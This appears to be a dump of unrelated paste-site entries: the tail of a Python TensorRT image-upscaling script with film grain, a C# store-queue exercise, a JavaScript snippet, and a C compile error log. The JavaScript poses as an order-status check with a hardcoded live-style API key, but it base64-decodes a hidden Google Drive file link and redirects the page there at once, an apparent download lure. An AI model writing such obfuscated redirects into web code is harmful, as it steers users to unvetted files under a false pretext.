            elif img.mode == 'LA' or img.mode == 'RGBA': # Luminance+Alpha or RGB+Alpha
                 img = img.convert('RGB')
            elif img.mode == 'L': # Grayscale
                 img = img.convert('RGB')
            elif img.mode != 'RGB':
                 print(f""Warning: Unexpected image mode {img.mode} for {image_path.name}. Attempting conversion to RGB."")
                 img = img.convert('RGB')
            return np.array(img)
    except FileNotFoundError: print(f""Error: File not found - {image_path}""); return None
    except (rawpy.LibRawError, IOError, SyntaxError) as e: print(f""Error loading {image_path.name} ({type(e).__name__}): {e}""); return None
    except Exception as e: print(f""Unexpected error loading {image_path.name}: {e}""); traceback.print_exc(); return None


# --- CORRECTED add_film_grain_np function ---
def add_film_grain_np(img_np_rgb: np.ndarray, alpha: float) -> np.ndarray:
    """"""
    Adds film grain directly to an RGB NumPy array (uint8).
    CORRECTED VERSION: Grain is added to the original image, alpha controls the amplitude.

    Args:
        img_np_rgb: Input image as a NumPy array (H, W, 3), dtype=uint8, RGB order.
        alpha: Grain intensity (0.0 to 1.0). Higher values result in stronger grain.

    Returns:
        NumPy array with added grain (H, W, 3), dtype=uint8, RGB order.
    """"""
    if not isinstance(img_np_rgb, np.ndarray) or img_np_rgb.dtype != np.uint8:
        try:
            img_np_rgb = img_np_rgb.astype(np.uint8)
        except Exception as e:
            print(f""Failed conversion to uint8 in add_film_grain_np: {e}"")
            return img_np_rgb # Return original if conversion fails

    if img_np_rgb.ndim != 3 or img_np_rgb.shape[2] != 3:
         print(f""Warning: add_film_grain_np expects 3 channels (RGB), received {img_np_rgb.shape}. Returning original."")
         return img_np_rgb

    h, w, c = img_np_rgb.shape

    # Generate grain (monochromatic then expanded to 3 channels)
    grain_std_dev = 20 # Standard deviation of Gaussian noise
    grain_mono = np.random.normal(0, grain_std_dev, (h, w)).astype(np.float32)
    grain = np.stack([grain_mono] * c, axis=2)

    # Blending: Add grain to the original image (converted to float)
    # Grain amplitude is controlled by alpha * some_scale
    grain_amplitude_scale = 80.0 # Scale for noise amplitude (adjust to taste)
    noise = alpha * grain_amplitude_scale * (grain / grain_std_dev) # Normalize grain before scaling with amplitude

    img_float = img_np_rgb.astype(np.float32)

    # Add noise to the image
    img_with_grain_float = img_float + noise

    # Clipping to [0, 255] and conversion back to uint8
    img_with_grain = np.clip(img_with_grain_float, 0, 255).astype(np.uint8)

    return img_with_grain


# --- process_image function (remains the same as the previous version, uses the corrected add_film_grain_np) ---
def process_image(
    image_path: Path,
    context: trt.IExecutionContext,
    bindings: list,
    d_input: cuda.DeviceAllocation,
    d_output: cuda.DeviceAllocation,
    stream: cuda.Stream,
    input_shape: tuple,
    output_shape: tuple,
    output_np_dtype: np.dtype,
    output_dir: Path,
    scale_factor: int,
    tile_size: int,
    overlap: int,
    output_format: str,
    jpg_quality: int,
    numpy_dtype: np.dtype,
    grain_alpha: float # Grain intensity (0.0-1.0)
):
    """"""Processes a single image through the TensorRT engine using a tiling approach and optionally adds grain.""""""
    start_time = time.time()
    img = load_image(image_path)
    if img is None: return None
    # Additional type check after load_image
    if not isinstance(img, np.ndarray) or img.dtype != np.uint8:
        print(f""Error: Image {image_path.name} was not loaded as a uint8 NumPy array. Type: {type(img)}, Dtype: {getattr(img, 'dtype', 'N/A')}"")
        return None
    if img.ndim != 3 or img.shape[2] != 3:
        print(f""Error: Image {image_path.name} is not in the expected RGB format (HxWx3). Shape: {img.shape}"")
        return None

    h, w = img.shape[0], img.shape[1]
    output_h, output_w = h * scale_factor, w * scale_factor
    output_img = np.zeros((output_h, output_w, 3), dtype=np.float32)
    weight_map = np.zeros((output_h, output_w, 3), dtype=np.float32)

    # --- Logic for weight_template and tiling remains the same ---
    y_grid, x_grid = np.mgrid[0:tile_size, 0:tile_size].astype(np.float64)
    center = (tile_size - 1) / 2.0
    sigma = tile_size / 4.0 # Sigma for the Gaussian window for blending
    weight_template = np.exp(-((x_grid - center)**2 + (y_grid - center)**2) / (2 * sigma**2))
    weight_template = np.repeat(weight_template[:, :, np.newaxis], 3, axis=2).astype(np.float32)
    scaled_tile_size = tile_size * scale_factor
    # Use INTER_LINEAR for a smoother weight map after resize
    scaled_weight_template = cv2.resize(weight_template, (scaled_tile_size, scaled_tile_size), interpolation=cv2.INTER_LINEAR)

    stride = tile_size - overlap
    # Calculate the number of tiles to cover the entire image
    x_tiles = 0 if w == 0 else (max(0, w - overlap - 1) // stride + 1) if w > overlap else 1
    y_tiles = 0 if h == 0 else (max(0, h - overlap - 1) // stride + 1) if h > overlap else 1
    total_tiles = max(1, x_tiles * y_tiles) # Ensure at least 1 if the image is smaller than the tile
    tile_times = []

    # HOST memory allocation
    h_input = cuda.pagelocked_empty(trt.volume(input_shape), dtype=numpy_dtype)
    h_output = cuda.pagelocked_empty(trt.volume(output_shape), dtype=output_np_dtype)

    with tqdm(total=total_tiles, desc=f""Tiles ({image_path.name})"", unit=""tile"", bar_format='{l_bar}{bar}| {n_fmt}/{total_fmt} [{elapsed}<{remaining}, {rate_fmt}]', leave=False) as pbar:
        # Iterate using stride to ensure overlap
        for y in range(0, h, stride):
             # If the remaining part is smaller than the overlap, move y to the end
             if y + tile_size > h and h > tile_size: y = h - tile_size
             for x in range(0, w, stride):
                 # If the remaining part is smaller than the overlap, move x to the end
                 if x + tile_size > w and w > tile_size: x = w - tile_size

                 tile_start_time = time.time()
                 # Determine the actual coordinates of the tile within the original image
                 y_start, y_end = y, min(y + tile_size, h)
                 x_start, x_end = x, min(x + tile_size, w)
                 tile_orig = img[y_start:y_end, x_start:x_end]
                 tile_h, tile_w = tile_orig.shape[:2]

                 # Add padding if the tile is smaller than tile_size
                 if tile_h < tile_size or tile_w < tile_size:
                     pad_h, pad_w = max(0, tile_size - tile_h), max(0, tile_size - tile_w)
                     pad_top, pad_bottom = pad_h // 2, pad_h - (pad_h // 2)
                     pad_left, pad_right = pad_w // 2, pad_w - (pad_w // 2)
                     # Use BORDER_REFLECT_101 for better results at the edges
                     tile = cv2.copyMakeBorder(tile_orig, pad_top, pad_bottom, pad_left, pad_right, cv2.BORDER_REFLECT_101)
                 else:
                     tile = tile_orig
                     pad_top, pad_left = 0, 0 # No padding

                 try:
                     # Input preparation (normalization and transposition)
                     # Ensure the input is float and in the range [0, 1]
                     tile_input_prep = tile.astype(numpy_dtype) / 255.0
                     tile_input = tile_input_prep.transpose(2, 0, 1) # HWC -> CHW
                     tile_input = np.expand_dims(tile_input, axis=0) # Add batch dimension -> NCHW

                     # Shape check before copying
                     if tile_input.shape != tuple(input_shape):
                          print(f""\nError: Shape of prepared tile {tile_input.shape} != expected {input_shape} for {image_path.name} ({y},{x})"")
                          pbar.update(1); continue # Skip this tile

                     # Inference (using execute_async_v3)
                     np.copyto(h_input, tile_input.ravel()) # Copy prepared input
                     cuda.memcpy_htod_async(d_input, h_input, stream)
                     context.execute_async_v3(stream_handle=stream.handle)
                     cuda.memcpy_dtoh_async(h_output, d_output, stream)
                     stream.synchronize()

                     # Output processing
                     tile_output_full = h_output.reshape(output_shape) # Reshape output
                     if tile_output_full.shape[0] == 1: tile_output_full = tile_output_full[0] # Remove batch dim. if it exists

                     # Conversion to FP32 for blending if the output was FP16 or another type
                     if tile_output_full.dtype != np.float32:
                         tile_output_full = tile_output_full.astype(np.float32)

                     tile_output_full = tile_output_full.transpose(1, 2, 0) # CHW -> HWC

                     # Cropping padding from the output
                     out_y_start, out_x_start = y * scale_factor, x * scale_factor
                     out_h_orig, out_w_orig = tile_h * scale_factor, tile_w * scale_factor

                     # Calculate coordinates for cropping padding from the scaled output
                     pad_top_scaled, pad_left_scaled = pad_top * scale_factor, pad_left * scale_factor
                     end_row = pad_top_scaled + out_h_orig
                     end_col = pad_left_scaled + out_w_orig

                     # Ensure cropping boundaries do not exceed tile_output_full dimensions
                     end_row = min(end_row, tile_output_full.shape[0])
                     end_col = min(end_col, tile_output_full.shape[1])
                     pad_top_scaled = min(pad_top_scaled, tile_output_full.shape[0] - 1)
                     pad_left_scaled = min(pad_left_scaled, tile_output_full.shape[1] - 1)

                     # Crop the relevant part of the output (without padding)
                     tile_output = tile_output_full[pad_top_scaled : end_row, pad_left_scaled : end_col, :]

                     # Determine the coordinates where this tile will be placed in the final image
                     out_y_end = out_y_start + tile_output.shape[0]
                     out_x_end = out_x_start + tile_output.shape[1]

                     # Ensure output coordinates do not exceed the final image dimensions
                     if out_y_end > output_img.shape[0] or out_x_end > output_img.shape[1]:
                         # This shouldn't happen if the logic is correct, but just in case
                         print(f""\nWarning: Output coordinates exceed dimensions for {image_path.name} ({y},{x})."")
                         out_y_end = min(out_y_end, output_img.shape[0])
                         out_x_end = min(out_x_end, output_img.shape[1])
                         # Crop tile_output to fit
                         tile_output = tile_output[:out_y_end-out_y_start, :out_x_end-out_x_start, :]

                     # Crop the corresponding part of the weight template
                     current_weight = scaled_weight_template[:tile_output.shape[0], :tile_output.shape[1], :]

                     # Blending (summing weighted values)
                     if tile_output.shape == current_weight.shape:
                          output_img[out_y_start:out_y_end, out_x_start:out_x_end] += tile_output * current_weight
                          weight_map[out_y_start:out_y_end, out_x_start:out_x_end] += current_weight
                     else:
                          print(f""\nWarning: Shape mismatch tile/weight for {image_path.name} ({y},{x}). Tile: {tile_output.shape}, Weight: {current_weight.shape}"")

                 except cuda.LogicError as e:
                     print(f""\nCUDA Logic Error in tile {image_path.name} ({y},{x}): {e}"")
                     traceback.print_exc() # Print traceback for CUDA errors
                 except Exception as e:
                     print(f""\nError processing TRT tile {image_path.name} ({y},{x}): {e}"")
                     traceback.print_exc()

                 # Time measurement and progress bar update
                 tile_time = time.time() - tile_start_time
                 tile_times.append(tile_time)
                 # (Progress bar update logic remains the same)
                 if tile_times:
                     avg_tile_time = sum(tile_times) / len(tile_times)
                     remaining_tiles = total_tiles - pbar.n - 1
                     if remaining_tiles > 0:
                          estimated_remaining_time = remaining_tiles * avg_tile_time
                          pbar.set_postfix_str(f""Avg: {avg_tile_time:.3f}s/tile, Remaining: {estimated_remaining_time:.1f}s"")
                     else:
                          pbar.set_postfix_str(f""Avg: {avg_tile_time:.3f}s/tile"")
                 pbar.update(1)
                 # End loops if we have processed the last tile
                 if x + stride >= w and y + stride >= h: break
             if y + stride >= h: break


    # Normalization by dividing with the weight map
    # Add a small value to weight_map to avoid division by zero where there was no overlap
    weight_map = np.maximum(weight_map, 1e-6)
    if output_img.shape == weight_map.shape:
        output_img_float = output_img / weight_map # Result is float32
    else:
        print(f""\nERROR: Shape mismatch output/weightmap for {image_path.name}."")
        return None

    # Conversion to uint8 AFTER normalization
    # Clipping to [0, 255] before conversion
    output_img_uint8 = np.clip(output_img_float * 255.0, 0, 255).astype(np.uint8)

    # --- GRAIN INTEGRATION ---
    final_output_img = output_img_uint8 # Start with the image without grain
    if grain_alpha > 0:
        try:
            # Use the corrected function
            final_output_img = add_film_grain_np(output_img_uint8, grain_alpha)
        except Exception as e:
            print(f""\nError adding grain for {image_path.name}: {e}"")
            traceback.print_exc()
            # Continue with the image without grain if an error occurs
            final_output_img = output_img_uint8
    # --------------------------

    # Saving the final image (with or without grain)
    output_filename = f""{image_path.stem}_upscaled_ESC.{output_format.lower()}""
    output_path = output_dir / output_filename
    try:
        output_image = Image.fromarray(final_output_img) # Use final_output_img

        save_params = {}
        fmt = output_format.lower()
        if fmt == 'jpg' or fmt == 'jpeg':
            save_params['quality'] = jpg_quality
            save_params['subsampling'] = 0 # Disable chroma subsampling for max quality
            save_params['optimize'] = True
        elif fmt == 'png':
            save_params['compress_level'] = 4 # Balance between speed and compression
            save_params['optimize'] = True
        # Add webp saving options if needed
        # elif fmt == 'webp':
        #     save_params['quality'] = jpg_quality # Reuse jpg_quality for webp
        #     save_params['lossless'] = False # Or True for lossless

        output_image.save(output_path, **save_params)
        elapsed_time = time.time() - start_time
        avg_tile_t = sum(tile_times) / len(tile_times) if tile_times else 0
        grain_msg = f""(grain alpha: {grain_alpha:.3f})"" if grain_alpha > 0 else """"
        tqdm.write(f""Finished: {image_path.name} -> {output_path.name} {grain_msg} (time: {elapsed_time:.2f}s, avg tile: {avg_tile_t:.3f}s)"")
        return output_path
    except Exception as e:
        print(f""\nError saving {output_path.name}: {e}""); traceback.print_exc(); return None


def main():
    # Argument parsing (same as before, with --grain_intensity)
    parser = argparse.ArgumentParser(description='TensorRT Batch Upscaling with Optional Film Grain.')
    parser.add_argument('--input_dir', type=str, default='input', help='Input directory with images.')
    parser.add_argument('--output_dir', type=str, default='output', help='Output directory for upscaled images.')
    parser.add_argument('--engine_path', type=str, default='ESC_REAL_GAN_tile_1448.engine', help='Path to TensorRT engine file.')
    parser.add_argument('--scale_factor', type=int, default=4, help='Upscaling factor (e.g., 4 for 4x).')
    parser.add_argument('--workers', type=int, default=1, help='Number of parallel workers (0 for auto, 1 for sequential).')
    parser.add_argument('--force', action='store_true', help='Overwrite existing output files.')
    parser.add_argument('--tile_size', type=int, default=1448, help='Tile size for processing (should match engine input).')
    parser.add_argument('--overlap', type=int, default=256, help='Overlap between tiles in pixels.')
    parser.add_argument('--output_format', type=str, default='jpg', choices=['png', 'jpg', 'jpeg', 'bmp', 'webp'], help='Output image format.')
    parser.add_argument('--jpg_quality', type=int, default=100, help='JPEG/WEBP quality (1-100).') # Adjusted help text
    parser.add_argument('--dtype', type=str, default='float16', choices=['float16', 'float32'], help='Data type for TensorRT input preparation (float16 or float32).')
    parser.add_argument('--grain_intensity', type=int, default=10, help='Film grain intensity (0-100, 0 to disable). Default: 10') # Changed default

    args = parser.parse_args()

    # Validate grain intensity
    if not 0 <= args.grain_intensity <= 100:
        print(""Error: --grain_intensity must be between 0 and 100."")
        sys.exit(1)
    # Convert intensity (0-100) to alpha (0.0-1.0)
    grain_alpha = args.grain_intensity / 100.0
    if grain_alpha > 0:
        print(f""Film grain will be added with intensity {args.grain_intensity}% (alpha={grain_alpha:.3f})"")

    if args.workers == 0: args.workers = os.cpu_count() or 1
    print(f""Using {args.workers} workers."")
    if args.workers < 0: print(""Error: Negative number of workers.""); sys.exit(1)

    input_dir, output_dir = Path(args.input_dir), Path(args.output_dir)
    engine_path = Path(args.engine_path)
    if not input_dir.is_dir(): print(f""Error: Input dir '{input_dir}' not found.""); sys.exit(1)
    if not engine_path.is_file(): print(f""Error: Engine file '{engine_path}' not found.""); sys.exit(1)
    output_dir.mkdir(parents=True, exist_ok=True)

    numpy_dtype = np.float16 if args.dtype == 'float16' else np.float32
    print(f""Will use {args.dtype} ({numpy_dtype.__name__}) for input preparation."")

    # --- Loading Engine and getting I/O info (same as before) ---
    print(f""--- DEBUG: TensorRT Python version: {trt.__version__} ---"")
    TRT_LOGGER = trt.Logger(trt.Logger.WARNING) # Can be changed to INFO for more details
    print(f""Loading TensorRT engine: {engine_path}"")
    engine, context = None, None
    try:
        with open(engine_path, ""rb"") as f, trt.Runtime(TRT_LOGGER) as runtime:
            engine = runtime.deserialize_cuda_engine(f.read())
        if not engine: raise RuntimeError(""Engine was not successfully deserialized."")
        print(f""TensorRT engine loaded successfully."")
        context = engine.create_execution_context()
        if not context: raise RuntimeError(""Cannot create execution context."")
        print(""TensorRT execution context created."")
    except Exception as e:
        print(f""Error loading engine/creating context: {e}""); traceback.print_exc(); sys.exit(1)

    # --- Getting I/O information (same as before) ---
    input_binding_idx, output_binding_idx = -1, -1
    input_shape, output_shape = None, None
    input_name, output_name = """", """"
    input_dtype_trt, output_dtype_trt = None, None
    output_np_dtype = np.float32 # Default NumPy type for output

    print(""--- Engine Tensor Information (TRT 10.x API) ---"")
    try:
        num_io_tensors = engine.num_io_tensors
        tensor_indices = list(range(num_io_tensors))

        for i in tensor_indices:
            name = engine.get_tensor_name(i)
            shape = engine.get_tensor_shape(name)
            dtype = engine.get_tensor_dtype(name)
            mode = engine.get_tensor_mode(name)

            print(f""Tensor {i}: Name='{name}', Shape={shape}, Dtype={dtype}, Mode={mode}"")

            if mode == trt.TensorIOMode.INPUT:
                if input_binding_idx != -1: print(""Warning: Multiple input tensors found. Using the first one."")
                else:
                    input_binding_idx = i
                    input_shape = tuple(shape) # Store as tuple
                    input_name = name
                    input_dtype_trt = dtype
                    # Check and warn about tile_size
                    if len(input_shape) == 4:
                        if input_shape[2] != args.tile_size or input_shape[3] != args.tile_size:
                            print(f""WARNING: Engine tile size ({input_shape[2]}x{input_shape[3]}) != --tile_size ({args.tile_size}). Using value from engine."")
                            args.tile_size = input_shape[2] # Automatically use dimension from engine
                    else:
                        print(f""WARNING: Input shape {input_shape} is not the expected 4D (NCHW)."")
            elif mode == trt.TensorIOMode.OUTPUT:
                if output_binding_idx != -1: print(""Warning: Multiple output tensors found. Using the first one."")
                else:
                    output_binding_idx = i
                    output_shape = tuple(shape) # Store as tuple
                    output_name = name
                    output_dtype_trt = dtype
                    # Determine NumPy type based on TRT output type
                    if output_dtype_trt == trt.float16: output_np_dtype = np.float16
                    elif output_dtype_trt == trt.int32: output_np_dtype = np.int32
                    elif output_dtype_trt == trt.float32: output_np_dtype = np.float32
                    else: print(f""Warning: Unsupported TRT output type {output_dtype_trt}. Using default np.float32."")

        if not input_name or not output_name:
            raise RuntimeError(""Failed to identify input or output tensor by name."")
        if not input_shape or not output_shape:
             raise RuntimeError(""Failed to get input or output tensor shape."")

        print(f""Identified Input: Index={input_binding_idx}, Name='{input_name}', Shape={input_shape}, Type={input_dtype_trt}"")
        print(f""Identified Output: Index={output_binding_idx}, Name='{output_name}', Shape={output_shape}, Type={output_dtype_trt} (NumPy: {output_np_dtype.__name__})"")
        print(""------------------------------------"")

    except Exception as e:
        print(f""Error getting tensor information: {e}""); traceback.print_exc(); sys.exit(1)


    # --- Device Memory Allocation (same as before) ---
    d_input, d_output, stream, bindings = None, None, None, None
    try:
        # Check data type compatibility
        if numpy_dtype == np.float16 and input_dtype_trt != trt.float16:
            print(f""WARNING: Input preparation dtype ({numpy_dtype.__name__}) differs from expected TRT dtype ({input_dtype_trt}). May cause errors or inefficiency."")
        elif numpy_dtype == np.float32 and input_dtype_trt == trt.float16:
             print(f""INFO: Input preparation dtype ({numpy_dtype.__name__}) has higher precision than TRT dtype ({input_dtype_trt}). TRT will perform conversion."")

        # Calculate buffer sizes
        input_volume = trt.volume(input_shape)
        output_volume = trt.volume(output_shape)
        d_input_size = input_volume * np.dtype(numpy_dtype).itemsize
        d_output_size = output_volume * np.dtype(output_np_dtype).itemsize

        # Allocate memory
        d_input = cuda.mem_alloc(d_input_size)
        d_output = cuda.mem_alloc(d_output_size)
        stream = cuda.Stream()

        # Set tensor addresses in the context using names (TRT 8.4+ API)
        context.set_tensor_address(input_name, int(d_input))
        context.set_tensor_address(output_name, int(d_output))
        bindings = None # Indicate we are not using the old address list

        print(""Device (GPU) memory allocated."")
        print(f""  Input buffer: {d_input_size / (1024**2):.2f} MiB (type: {numpy_dtype.__name__})"")
        print(f""  Output buffer: {d_output_size / (1024**2):.2f} MiB (type: {output_np_dtype.__name__})"")

    except cuda.MemoryError as e:
         required_gib = (d_input_size + d_output_size) / (1024**3)
         print(f""Error: Insufficient GPU memory! Need at least {required_gib:.2f} GiB just for buffers."")
         try:
             free_mem, total_mem = cuda.mem_get_info()
             print(f""Available: {free_mem / (1024**3):.2f} GiB, Total: {total_mem / (1024**3):.2f} GiB"")
         except Exception: pass # Ignore if mem_get_info fails
         sys.exit(1)
    except Exception as e:
        print(f""Error allocating GPU memory or setting addresses: {e}""); traceback.print_exc(); sys.exit(1)

    # --- Finding images (same as before) ---
    supported_extensions = ['.jpg', '.jpeg', '.png', '.bmp', '.tiff', '.tif', '.webp', '.arw', '.cr2', '.nef', '.dng', '.raf', '.raw']
    all_image_paths = []
    print(f""Searching: {input_dir}"")
    for ext in supported_extensions:
        # Case-insensitive search
        all_image_paths.extend(input_dir.glob(f'*[{ext[1:].lower()}{ext[1:].upper()}]'))

    # Filter duplicates if e.g., .jpg and .JPG of the same name exist
    unique_image_paths = {p.resolve() for p in all_image_paths}
    all_image_paths = list(unique_image_paths)


    image_paths_to_process = []
    processed_stems = set() # Used to avoid processing the same file multiple times if duplicates exist
    output_suffix = f""_upscaled_ESC.{args.output_format.lower()}""
    existing_outputs_stems = set()
    if not args.force:
        # Check existing output files to skip them
        for f in output_dir.glob(f'*{output_suffix}'):
            # Remove suffix to get the original stem
            original_stem = f.stem.replace('_upscaled_ESC', '')
            existing_outputs_stems.add(original_stem)
        if existing_outputs_stems: print(f""Found {len(existing_outputs_stems)} existing outputs (will be skipped)."")

    for img_path in all_image_paths:
        stem = img_path.stem
        # Skip if already processed or if output exists (and not --force)
        if stem in processed_stems: continue
        if not args.force and stem in existing_outputs_stems: continue
        processed_stems.add(stem)
        image_paths_to_process.append(img_path)

    if not image_paths_to_process: print(f""No new images to process.""); return
    print(f""Found {len(image_paths_to_process)} images to process."")

    # --- Image Processing (ThreadPoolExecutor or sequential, passes grain_alpha) ---
    results = []
    start_overall_time = time.time()
    if args.workers > 1:
        print(f""Starting processing with {args.workers} workers..."")
        # Note: Sharing a single TRT context and CUDA stream among multiple threads
        # can lead to performance issues or even errors.
        # Ideally, each worker should have its own context and stream.
        # For simplicity, we use a shared context/stream here.
        with concurrent.futures.ThreadPoolExecutor(max_workers=args.workers) as executor:
            # Create a map of futures to image paths
            futures_map = {
                executor.submit(
                    process_image,
                    img_path, context, bindings, d_input, d_output, stream,
                    input_shape, output_shape, output_np_dtype, output_dir,
                    args.scale_factor, args.tile_size, args.overlap,
                    args.output_format, args.jpg_quality, numpy_dtype,
                    grain_alpha # Pass grain alpha
                ): img_path for img_path in image_paths_to_process
            }
            # Use tqdm to track the progress of completed futures
            for future in tqdm(concurrent.futures.as_completed(futures_map), total=len(futures_map), desc=""Overall Progress"", unit=""image""):
                img_path_completed = futures_map[future]
                try:
                    result = future.result() # Get the result (path to output file or None)
                    if result: results.append(result)
                except Exception as e:
                    # Print the error that occurred within the thread
                    tqdm.write(f""\nERROR in worker for {img_path_completed.name}: {e}"")
                    # Optional: Print full traceback for more detailed diagnostics
                    # tqdm.write(traceback.format_exc())
    else:
        print(""Starting sequential processing..."")
        for image_path in tqdm(image_paths_to_process, desc=""Overall Progress"", unit=""image""):
            try:
                result = process_image(
                    image_path, context, bindings, d_input, d_output, stream,
                    input_shape, output_shape, output_np_dtype, output_dir,
                    args.scale_factor, args.tile_size, args.overlap,
                    args.output_format, args.jpg_quality, numpy_dtype,
                    grain_alpha # Pass grain alpha
                )
                if result: results.append(result)
            except Exception as e:
                # Print the error that occurred during sequential processing
                tqdm.write(f""\nERROR processing {image_path.name}: {e}"");
                tqdm.write(traceback.format_exc())

    # --- Final Report (same as before) ---
    end_overall_time = time.time()
    total_time = end_overall_time - start_overall_time
    num_processed = len(results)
    num_total_attempted = len(image_paths_to_process)
    avg_time_per_image = total_time / num_processed if num_processed > 0 else 0
    print(""-"" * 30)
    print(f""Processing finished in {total_time:.2f} s."")
    print(f""Attempted to process: {num_total_attempted} images."")
    print(f""Successfully saved: {num_processed} images."")
    if num_processed > 0: print(f""Average time per successful image: {avg_time_per_image:.2f} s."")
    failed_count = num_total_attempted - num_processed
    if failed_count > 0: print(f""Failed/skipped images: {failed_count}"")
    print(f""Output files in: {output_dir.resolve()}"") # Print full path

    # Cleanup (optional, but good practice)
    # PyCUDA autoinit should take care of the context, but explicitly freeing allocations isn't bad
    try:
        if d_input: d_input.free()
        if d_output: d_output.free()
        # Context is destroyed automatically with pycuda.autoinit
        print(""GPU resources released."")
    except Exception as e:
        print(f""Error releasing GPU resources: {e}"")


if __name__ == ""__main__"":
    # Ensure CUDA initialization happens before any CUDA operations
    # pycuda.autoinit does this, but calling main() is sufficient
    main()

# --- END OF FILE batch_trt_esc_GRAIN_ALPHA_en_comments.py ---"
GNE9tHuH,Очередь в магазине,junniorrkaa,C#,Wednesday 9th of April 2025 01:01:34 PM CDT,"using System;
using System.Collections.Generic;

namespace CSLight
{
    internal class Program
    {
        static void Main()
        {
            Queue<int> clients = new Queue<int>();

            int minValue = 10;
            int maxValue = 50;
            int purchaseAmount;

            Random random = new Random();

            int totalAmount = 0;
            int clientsInQueue = 5;

            for (int i = 0; i < clientsInQueue; i++)
            {
                clients.Enqueue(i + 1);
            }

            while (clients.Count != 0)
            {
                purchaseAmount = random.Next(minValue, maxValue);

                Console.WriteLine($""Сейчас в очереди {clients.Dequeue()} клиент"");
                Console.Write(""\nСумма покупки: "" + purchaseAmount);
                Console.Write(""\nОбщая сумма: "" + totalAmount);

                totalAmount += purchaseAmount;

                Console.ReadKey();
                Console.Clear();
            }

            Console.Write(""Клиентов больше нет. Итоговая общая сумма: "" + totalAmount + ""\n"");
        }
    }
}"
wq791DA7,Untitled,zebmekey,JavaScript,Wednesday 9th of April 2025 01:00:45 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/55131/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
FTxxV1PY,Untitled,dtorkin,C,Wednesday 9th of April 2025 12:48:14 PM CDT,"dtorkin@ubuntu1:~/Desktop/v0.12$ make
gcc -Wall -Wextra -g -Iprotocol -Iio -Isvm -Iuvm -Iconfig -pthread    -c -o svm/svm_main.o svm/svm_main.c
svm/svm_main.c: In function ‘handle_shutdown_signal’:
svm/svm_main.c:17:5: warning: implicit declaration of function ‘fprintf’ [-Wimplicit-function-declaration]
   17 |     fprintf(stdout, ""\nSVM: Получен сигнал завершения (%d). Инициируем остановку потоков...\n"", sig);
      |     ^~~~~~~
svm/svm_main.c:6:1: note: include ‘<stdio.h>’ or provide a declaration of ‘fprintf’
    5 | #include ""svm_timers.h"" // Теперь содержит и timer_thread_func, и stop_timer_thread и т.д.
  +++ |+#include <stdio.h>
    6 | 
svm/svm_main.c:17:5: warning: incompatible implicit declaration of built-in function ‘fprintf’ [-Wbuiltin-declaration-mismatch]
   17 |     fprintf(stdout, ""\nSVM: Получен сигнал завершения (%d). Инициируем остановку потоков...\n"", sig);
      |     ^~~~~~~
svm/svm_main.c:17:5: note: include ‘<stdio.h>’ or provide a declaration of ‘fprintf’
svm/svm_main.c:17:13: error: ‘stdout’ undeclared (first use in this function)
   17 |     fprintf(stdout, ""\nSVM: Получен сигнал завершения (%d). Инициируем остановку потоков...\n"", sig);
      |             ^~~~~~
svm/svm_main.c:17:13: note: ‘stdout’ is defined in header ‘<stdio.h>’; did you forget to ‘#include <stdio.h>’?
svm/svm_main.c:17:13: note: each undeclared identifier is reported only once for each function it appears in
svm/svm_main.c:19:5: error: ‘keep_running’ undeclared (first use in this function)
   19 |     keep_running = false;
      |     ^~~~~~~~~~~~
svm/svm_main.c:23:9: error: ‘svm_incoming_queue’ undeclared (first use in this function)
   23 |     if (svm_incoming_queue) queue_shutdown(svm_incoming_queue);
      |         ^~~~~~~~~~~~~~~~~~
svm/svm_main.c:23:29: warning: implicit declaration of function ‘queue_shutdown’ [-Wimplicit-function-declaration]
   23 |     if (svm_incoming_queue) queue_shutdown(svm_incoming_queue);
      |                             ^~~~~~~~~~~~~~
svm/svm_main.c:24:9: error: ‘svm_outgoing_queue’ undeclared (first use in this function)
   24 |     if (svm_outgoing_queue) queue_shutdown(svm_outgoing_queue);
      |         ^~~~~~~~~~~~~~~~~~
svm/svm_main.c: In function ‘main’:
svm/svm_main.c:32:9: warning: implicit declaration of function ‘printf’ [-Wimplicit-function-declaration]
   32 |         printf(""SVM запуск...\n"");
      |         ^~~~~~
svm/svm_main.c:32:9: note: include ‘<stdio.h>’ or provide a declaration of ‘printf’
svm/svm_main.c:32:9: warning: incompatible implicit declaration of built-in function ‘printf’ [-Wbuiltin-declaration-mismatch]
svm/svm_main.c:32:9: note: include ‘<stdio.h>’ or provide a declaration of ‘printf’
svm/svm_main.c:36:9: warning: implicit declaration of function ‘exit’ [-Wimplicit-function-declaration]
   36 |         exit(EXIT_FAILURE);
      |         ^~~~
svm/svm_main.c:6:1: note: include ‘<stdlib.h>’ or provide a declaration of ‘exit’
    5 | #include ""svm_timers.h"" // Теперь содержит и timer_thread_func, и stop_timer_thread и т.д.
  +++ |+#include <stdlib.h>
    6 | 
svm/svm_main.c:36:9: warning: incompatible implicit declaration of built-in function ‘exit’ [-Wbuiltin-declaration-mismatch]
   36 |         exit(EXIT_FAILURE);
      |         ^~~~
svm/svm_main.c:36:9: note: include ‘<stdlib.h>’ or provide a declaration of ‘exit’
svm/svm_main.c:36:14: error: ‘EXIT_FAILURE’ undeclared (first use in this function)
   36 |         exit(EXIT_FAILURE);
      |              ^~~~~~~~~~~~
svm/svm_main.c:36:14: note: ‘EXIT_FAILURE’ is defined in header ‘<stdlib.h>’; did you forget to ‘#include <stdlib.h>’?
svm/svm_main.c:38:5: warning: implicit declaration of function ‘init_message_handlers’ [-Wimplicit-function-declaration]
   38 |     init_message_handlers();
      |     ^~~~~~~~~~~~~~~~~~~~~
